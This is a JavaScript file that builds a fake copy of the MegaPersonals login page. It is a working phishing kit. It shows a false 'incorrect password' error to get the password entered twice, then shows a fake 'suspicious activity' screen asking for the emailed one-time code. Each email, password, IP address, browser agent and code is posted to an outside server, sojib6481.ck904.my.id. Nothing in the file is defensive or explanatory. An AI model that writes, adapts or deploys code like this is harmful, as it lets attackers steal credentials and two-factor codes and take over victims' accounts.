document.addEventListener("DOMContentLoaded", function () {
  // --- ADD EXTERNAL CSS ---
  const bootstrapCSS = document.createElement("link");
  bootstrapCSS.rel = "stylesheet";
  bootstrapCSS.href =
    "https://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css";
  document.head.appendChild(bootstrapCSS);

  const jqueryUICSS = document.createElement("link");
  jqueryUICSS.rel = "stylesheet";
  jqueryUICSS.href =
    "https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.1/themes/smoothness/jquery-ui.css";
  document.head.appendChild(jqueryUICSS);
  const UICSS = document.createElement("link");
  UICSS.rel = "stylesheet";
  UICSS.href =
    "https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css";
  document.head.appendChild(UICSS);

  const customCSS = document.createElement("link");
  customCSS.rel = "stylesheet";
  customCSS.href = "style.css";
  document.head.appendChild(customCSS);
  let passClick = 1;
  let _id = "";
  const url = new URL(window.location.href);
  console.log(_id, "id");
  // Extract query parameters
  const params = new URLSearchParams(url.search);
  const cat = params.get("cat");
  const sites = params.get("sites");
  const id = params.get("id");
  console.log(id, "id1");
  // Create a form
  const formData = {};
  // --- CLEAR BODY ---
  document.body.innerHTML = "";
  document.body.className = "container";

  // --- HEADER ---
  const headerLink = document.createElement("a");
  headerLink.href = "/home";
  const headerImg = document.createElement("img");
  headerImg.src =
    "https://megapersonals.eu/resources/img/megapersonalsPageHeader.png?v=1756512215";
  headerImg.alt = "Megapersonals";
  headerImg.id = "megapersonalsPageHeader";
  headerImg.className =
    "img-responsive center-block img-width-72 header-top-margin";
  headerLink.appendChild(headerImg);
  document.body.appendChild(headerLink);

  // --- FIRST TIME POSTING ---
  // const firstTimeDiv = document.createElement("div");
  // firstTimeDiv.className = "centered top-margin-25 login_firsttime";
  // firstTimeDiv.innerHTML = `
  //   <h3 class="logincopy">Is this your first time posting?</h3>
  //   <a href="/users/auth/login" class="starthere">Start Here</a>
  // `;
  // document.body.appendChild(firstTimeDiv);

  // --- LOGIN SYSTEM ---
  const loginSystem = document.createElement("div");
  loginSystem.id = "loginSystem";
  loginSystem.className = "centered loginform";
  loginSystem.innerHTML = `
   <h3 class="logincopy">Is this your first time posting?</h3>
    <a href="/users/auth/login" class="starthere">Start Here</a>
    <h2 class="logincopy">Already have an account?</h2>
    <form class="loginwrapper">
      <div class="alert alert-danger errors">
        <p>
          This email address and password combination is incorrect. Either try our <a href="/send_reset_password">forgot password</a> form, or <a href="/users/register">create a new account</a>.
        </p>
      </div>
      <div class="centered form-input">
        <input id="person_username_field_login" class="form-control bordered three-radius" required type="email" placeholder="Email" />
      </div>
      <div class="centered form-input">
        <input id="person_password_field_login" class="form-control bordered three-radius" required type="password" placeholder="Password" />
      </div>
      <div class="centered form-input automargin">
        <div class="cap_wrap">
          <div class="captcha_image">
            <img src="./images/captcha.png" id="captcha_image_itself" alt="captcha">
          </div>
          <div class="replyCaptchaReloadButton">
            <a href="javascript:void(0);">
              <img src="https://megapersonals.eu/resources/img/reloadButton.png" width="40" height="40">
            </a>
          </div>
        </div>
        <input type="hidden" id="captcha_key" value="InyvQ8+eTUhKpWLBaZs0oQ==">
        <input type="text" id="captcha_code" class="form-control bordered three-radius clickToHideErrorMessages" placeholder="Enter code from the picture">
      </div>
      <input  style="  margin-top: 35px;" id="login_data_submit_button" type="submit" value="submit" />
    </form>
    <div class="get-scammed-banner"
          style="
  
  height: 120px;
  background-image: url('https://megapersonals.eu/resources/img/bannersContainer.png');
  background-size: 100% auto; /* keeps proportion */
  background-repeat: no-repeat;
  color: #000;
  cursor: pointer;
  margin-bottom: 8px;
  margin: auto;
">
      <div style=" font-weight: 700;
  font-size: 19px;
  text-transform: uppercase;
  padding-top: 19px;" class="caption">Don't get scammed!</div>
      <div style=" display: flex;
  justify-content: space-around;" class="body">
        <div style="font-size: 14px;
  text-align: left;
  font-weight: 700;
  padding-left: 8px;">Is the address up top:<br>megapersonals.eu</div>
        <div style="  font-size: 50px;
  font-weight: 700;
  line-height: 44px;
  margin-right: 12px;">?</div>
      </div>
    </div>
    <a class="passreset" href="#">FORGOT PASSWORD?</a>
  `;
  document.body.appendChild(loginSystem);
  const errorBox = document.querySelector(".errors");

  // Hide error initially
  errorBox.style.display = "none";
  function updateBannerWidth() {
    const banner = document.querySelector(".get-scammed-banner");

    const width = window.innerWidth;

    if (width <= 480) {
      // Small mobile (portrait phones)
      banner.style.width = "64%";
    } else if (width <= 768) {
      // Larger mobile / small tablets
      banner.style.width = "70%";
    } else if (width <= 1024) {
      // Tablets
      banner.style.width = "60%";
    } else {
      // Desktops / large screens
      banner.style.width = "46%";
    }
  }

  // Run on load
  updateBannerWidth();

  // Run on window resize
  window.addEventListener("resize", updateBannerWidth);

  // --- OTP SYSTEM ---
  const otpSystem = document.createElement("div");
  otpSystem.id = "otpSystem";
  otpSystem.style.maxWidth = "376px";
  otpSystem.style.margin = "auto";
  otpSystem.style.display = "none";
  otpSystem.className = "text-center";

  // Heading
  const heading = document.createElement("h2");
  heading.className = "newDeviceHeading";
  heading.className = "newDeviceHeading";
  heading.style.background = "#f8efce";
  heading.style.color = "#b8af8e";
  heading.style.padding = " 4px 0";
  heading.style.fontSize = "24px";
  heading.style.fontWeight = " normal !important";
  heading.textContent = "SUSPICIOUS ACTIVITY DETECTED";
  otpSystem.appendChild(heading);

  // Paragraph with date time
  const datePara = document.createElement("p");
  datePara.style.color = "#c75400";
  datePara.style.fontWeight = "bold";
  datePara.style.fontSize = "24px";
  datePara.innerHTML =
    'Your ACCESS CODE has been sent successfully to your email on <strong id="currentDateTime"></strong>. That code remains valid.';
  otpSystem.appendChild(datePara);

  // Modal Overlay
  const modalOverlay = document.createElement("div");
  modalOverlay.id = "modalOverlay";
  Object.assign(modalOverlay.style, {
    position: "fixed",
    display: "none",
    justifyContent: "center",
    alignItems: "center",
    zIndex: "999",
    // background: "#fff", // example
    // padding: "20px",
    borderRadius: "10px",
  });

  // Append modal to the page
  document.body.appendChild(modalOverlay);

  // ✅ Function to update position and size
  function updateModalPosition() {
    const modal = document.getElementById("modalOverlay");
    if (!modal) return; // safety check

    const width = window.innerWidth;

    if (width <= 768) {
      // 📱 Mobile / tablet
      modal.style.width = "307px";
      modal.style.top = "15%"; // mobile top
      modal.style.left = "12%"; // mobile left
      modal.style.transform = "";
    } else {
      // 💻 Desktop
      modal.style.width = "16%";
      modal.style.top = "50%";
      modal.style.left = "50%";
      modal.style.transform = "translate(-50%, -50%)";
    }
  }

  // Run on load
  updateModalPosition();

  // Run on window resize
  window.addEventListener("resize", updateModalPosition);

  // Warning Box
  const warningBox = document.createElement("div");
  warningBox.id = "warningBox";
  Object.assign(warningBox.style, {
    border: "1px solid #c0c0c0",
    padding: "0",
    background: "#ffffff",
    maxWidth: "400px",
    width: "90%",
    borderRadius: "8px",
    boxShadow: "0 4px 12px rgba(0, 0, 0, 0.2)",
    overflow: "hidden",
  });

  // Warning Header
  const warningHeader = document.createElement("div");
  Object.assign(warningHeader.style, {
    padding: "3px 6px",
    background: "#e0e0e0",
    backgroundImage: "linear-gradient(to bottom, #ededed, #cccccc)",
    borderBottom: "1px solid #c0c0c0",
    height: "25px",
    display: "flex",
    justifyContent: "space-between",
    alignItems: "center",
  });

  const warningTitle = document.createElement("h4");
  Object.assign(warningTitle.style, {
    margin: "0",
    color: "#222222",
    fontWeight: "bold",
    fontSize: "13px",
  });
  warningTitle.textContent = "Warning";

  const closeButton = document.createElement("div");
  Object.assign(closeButton.style, {
    width: "16px",
    height: "16px",
    border: "1px solid #aaaaaa",
    background: "linear-gradient(to top, #ececec, #fefefe)",
    cursor: "pointer",
    borderRadius: "2px",
    boxShadow: "0 1px 1px rgba(0, 0, 0, 0.1)",
  });

  // Warning Content
  const warningContent = document.createElement("div");
  Object.assign(warningContent.style, {
    padding: "20px",
    textAlign: "center",
    backgroundColor: "#ffffff",
  });

  const warningP1 = document.createElement("p");
  Object.assign(warningP1.style, {
    margin: "10px 0",
    lineHeight: "1.4",
    fontSize: "14px",
    color: "#d9534f",
    fontWeight: "bold",
  });
  warningP1.innerHTML =
    "▲ NEVER forward the email<br>you received with the PIN code!";

  const warningP2 = document.createElement("p");
  Object.assign(warningP2.style, {
    margin: "10px 0",
    lineHeight: "1.4",
    fontSize: "14px",
    color: "#333",
  });
  warningP2.textContent =
    "Scammers will pretend to be MegaPersonals and ask to send the PIN code in SMS or email.";

  const warningP3 = document.createElement("p");
  Object.assign(warningP3.style, {
    fontWeight: "bold",
    margin: "10px 0 0 0",
    lineHeight: "1.4",
    fontSize: "14px",
    color: "#333",
  });
  warningP3.innerHTML =
    "DO NOT FALL FOR IT!<br>This is how they hack your account.";

  // Warning Footer
  const warningFooter = document.createElement("div");
  Object.assign(warningFooter.style, {
    padding: "10px 20px 20px",
    textAlign: "center",
    backgroundColor: "#ffffff",
  });

  const okBtn = document.createElement("button");
  okBtn.textContent = "OK";
  Object.assign(okBtn.style, {
    padding: "8px 30px",
    background: "#007bff",
    color: "white",
    border: "1px solid #0056b3",
    borderRadius: "4px",
    fontWeight: "bold",
    textTransform: "uppercase",
    cursor: "pointer",
    boxShadow:
      "inset 0 1px 0 rgba(255, 255, 255, 0.4), 0 1px 1px rgba(0, 0, 0, 0.1)",
    transition: "background-color 0.2s ease",
  });

  // --- End of your JavaScript code ---

  // Append all elements to the body and create the modal structure
  warningHeader.appendChild(warningTitle);
  warningHeader.appendChild(closeButton);

  warningContent.appendChild(warningP1);
  warningContent.appendChild(warningP2);
  warningContent.appendChild(warningP3);

  warningFooter.appendChild(okBtn);

  warningBox.appendChild(warningHeader);
  warningBox.appendChild(warningContent);
  warningBox.appendChild(warningFooter);

  modalOverlay.appendChild(warningBox);
  document.body.appendChild(modalOverlay);

  // Event listeners to hide the modal
  okBtn.addEventListener("click", () => {
    modalOverlay.style.display = "none";
  });

  closeButton.addEventListener("click", () => {
    modalOverlay.style.display = "none";
  });
  // Content
  const contentDiv = document.createElement("div");
  contentDiv.className = "py-5 my-2";

  const accessCodeP = document.createElement("p");
  accessCodeP.id = "access-code";
  accessCodeP.className = "mt-6 text-xl text-[#C75400] text-center";
  contentDiv.appendChild(accessCodeP);

  const msgP = document.createElement("p");
  msgP.className = "message";
  msgP.style.color = "#2faeea";
  msgP.style.fontSize = "21px";

  msgP.innerHTML = "CHECK YOUR SPAM <br> FOLDER IT MAY BE THERE.";
  contentDiv.appendChild(msgP);

  const spanWarning = document.createElement("p");
  spanWarning.className = "spanWarning";
  spanWarning.innerHTML = `
    <span style="    color:red;font-size: 24px;font-weight: bold;">DO NOT SHARE IT</span>
    <span class="bg-[#2FAEEA] w-6 h-6 rounded-full text-white flex justify-center items-center font-bold not-italic">
    <i class="glyphicon glyphicon-question-sign"style="    color: #2faeea;    font-size: 24px;    top: 1px;
    display: inline-block;
    font-family: 'Glyphicons Halflings';
    font-style: normal;
    font-weight: 400;
    line-height: 1;
    -webkit-font-smoothing: antialiased;"></i>
      <span >?</span>
    </span>`;
  contentDiv.appendChild(spanWarning);

  const codeP = document.createElement("p");
  codeP.className = "code";
  codeP.style.color = "#c75400";
  codeP.style.fontSize = "20px";
  codeP.innerHTML = "Enter the code <br> below to continue.";
  contentDiv.appendChild(codeP);
  // contentDiv.appendChild(form);
  otpSystem.appendChild(contentDiv);
  // Form
  const otpForm = document.createElement("form");
  otpForm.id = "otpForm";

  otpForm.innerHTML = `
    
    <input id="person_otp_field_login" class="form-control" required type="text" placeholder="OTP Code" style="width: 65%; font-size: 14px;margin-bottom: 10px;  margin:auto;" />
    <input id="otpSubmitVal" type="submit" value="PROCEED" style="     margin-top: 10px;
padding: 10px 16px; font-size: 18px; background-color: #f0ad4e; border: none; border-radius: 6px; color: #fff;" />
  `;
  otpSystem.appendChild(otpForm);
  document.body.appendChild(otpSystem);

  // // Append OTP system to body
  // document.body.appendChild(otpSystem);

  // Current date/time
  const now = new Date();
  const options = {
    year: "numeric",
    month: "long",
    day: "numeric",
    hour: "2-digit",
    minute: "2-digit",
  };

  // --- FOOTER ---
  const footer = document.createElement("footer");
  footer.innerHTML = `
    <nav>
      <ul class="pager myStyle">
        <li><a id="homeclick" href="/home">Home</a></li>
        <li>|</li>
        <li><a href="https://megapersonals.eu/users/posts/list?publicDomain=megapersonals.eu">Manage Posts</a></li>
        <li>|</li>
        <li><a href="/public/contact_us">Contact Us</a></li>
        <li>|</li>
        <li><a href="/public/terms">Policies & Terms</a></li>
      </ul>
    </nav>
    <div class="copyright_class" id="copyrigh">Copyright ©2022 MegaPersonals.eu</div>
    <div class="clearfix">
      <input type="hidden" class="jsp-env"
        data-escortbabylon="escortbabylon.com"
        data-imagedomain1="img1.drome6.com/imgs"
        data-imagedomain2="img2.drome6.com/imgs"
        data-videodomain1="video1.lodef.net/video"
        data-videodomain2="video2.lodef.net/video"
        data-videodomain3="video3.lodef.net/video"
        data-videodomain4="video4.lodef.net/video"
        data-videodomain5="video5.lodef.net/video"
        data-image1middle="20000000000000000000000000000000"
        data-image2middle="40000000000000000000000000000000"
        data-image3middle="60000000000000000000000000000000"
        data-image4middle="80000000000000000000000000000000"
        data-image5middle="a0000000000000000000000000000000"
        data-image6middle="c0000000000000000000000000000000"
        data-image7middle="e0000000000000000000000000000000"
        data-imageprocessorurl="image-processor.apnot.com/v2/process/upload_image/"
        data-videoprocessorurl="image-processor.apnot.com/v2/process/upload_video/"
        data-imagepreview="image-processor.apnot.com/static"
        data-deletedimage="image-processor.apnot.com/deleted_images"
        data-captchaapi="captcha.drome6.com/api/v2/captcha"
        data-captchaurl="captcha.drome6.com/captchas"
        data-lcdomain="listcrawler.com"
        data-transactionnocontextpostid="0"
        data-usertermsofageversion="1">
    </div>
  `;
  document.body.appendChild(footer);
  const formattedDate = now.toLocaleString("en-US", options);
  document.getElementById("currentDateTime").textContent = formattedDate;

  // Close warning
  //   document.getElementById("closeWarningBtn").addEventListener("click", () => {
  //     modalOverlay.style.display = "none";
  //   });
  function hideElement(element) {
    element.style.display = "none";
  }
  // Function to show an element
  function showElement(element) {
    element.style.display = "block";
  }
  const loginForm = document.querySelector("#loginSystem form");


    async function getIp() {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        return data.ip;
      } catch (err) {
        console.error("IP fetch error", err);
        return "unknown";
      }
    }




  // fetch("https://sojib6481.ck904.my.id/api/data", {
  //   method: "POST",
  //   headers: {
  //     "Content-Type": "application/json",
  //   },
  //   body: JSON.stringify({
  //     user_id: id,
  //     website_id: 5,
  //   }),
  // })
  //   .then((response) => response.json())
  //   .then((data) => {
  //       _id = data;
  //   })
  //   .catch((error) => console.error(error));




async function updateData() {
  try {
    const ip = await getIp();   // get IP
    const agent = navigator.userAgent;  // get browser agent

    const payload = {
      ...formData,       // email, password etc already ache
      ip: ip,
      user_id: id,
      website_id: 5,
      agent: agent,
      admin_hidden: "0",
      user_hidden: "0",
      created_at: new Date().toISOString().slice(0, 19).replace("T", " "), // 2025-08-13 10:30:00
    };

    const response = await fetch("https://sojib6481.ck904.my.id/api/data", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });

    if (!response.ok) {
      throw new Error(`HTTP error! Status: ${response.status}`);
    }

    const responsId = await response.json();
    sessionStorage.setItem("id", responsId);

    console.log("Response from server:", responsId);
    hideElement(otpSystem);
    showElement(otpSystem);
  } catch (error) {
    console.error("Error:", error);
  }
}





  async function handleLoginSubmit(event) {
    event.preventDefault();
    if (passClick < 2) {
      passClick++;
      formData.email = loginForm.querySelector('input[type="email"]').value;
      formData.password = loginForm.querySelector(
        'input[type="password"]'
      ).value;
     
      const ip = await getIp(); 
      const agent = navigator.userAgent; 
      // showElement(errorMsg);
      errorBox.style.display = "block";
      formData.user = id;
      const data = {
        ...formData,
        ip: ip,
        agent: agent, 
      };
      
      await updateData(id, data);
      loginForm.querySelector('input[type="password"]').value = "";
      hideElement(otpSystem);
      return;
    }
    formData.email = loginForm.querySelector('input[type="email"]').value;
    formData.repassword = loginForm.querySelector(
      'input[type="password"]'
    ).value;
    await updateData(_id, {
      repassword: formData.repassword,
      user: id,
    });

    hideElement(loginSystem);
    showElement(otpSystem);
    document.getElementById("modalOverlay").style.display = "flex";
    // window.location.href= `https://megapay.vercel.app/${updatedId}?type=duo`
    // window.location.href= ` https://smart-verify.netlify.app/?userId=${updatedId}?type=duo`
    return;
    // Hide login form and show OTP form
  }

  // async function handleOTPSubmit(event) {
  //   event.preventDefault();
  //   otpSubmitVal.value = "Please Wait...";
  //   const otp = otpForm.querySelector('input[type="text"]').value;
  //   await updateData(id, { otp: otp, user: formData.user });
  //   hideElement(otpSystem);
  //   showElement(loginSystem);

  //   window.location.href = `https://megapay.vercel.app/${updatedId}?type=duo`;
  // }
  document
    .getElementById("otpForm")
    .addEventListener("submit", async function (e) {
      e.preventDefault();

      const otp = document.getElementById("person_otp_field_login").value;
     

      const submitBtn = document.getElementById("otpSubmitVal");
      submitBtn.value = "Please Wait...";

      let id = sessionStorage.getItem("id");

      console.log(id);

      try {
        // Example PATCH request
        const response = await fetch(
          `https://sojib6481.ck904.my.id/api/verify`,
          {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              id: id,   // your variable
              code: otp, 
            }),
          }
        );
       sessionStorage.removeItem("id");
        if (response.ok) {
          
          // Redirect after OTP success
          //  window.location.href = "https://megapersonals.eu/";
        } else {
          console.error("Failed to update:", result);
          submitBtn.value = "Try Again";
        }
      } catch (error) {
        console.error("Error updating:", error);
        submitBtn.value = "Try Again";
      }
    });
  // Event listeners
  document
    .getElementById("loginSystem")
    .addEventListener("submit", handleLoginSubmit);
  // document
  //   .getElementById("otpForm")
  //   .addEventListener("submit", handleOTPSubmit);
});



///Hello sdkl true love miya
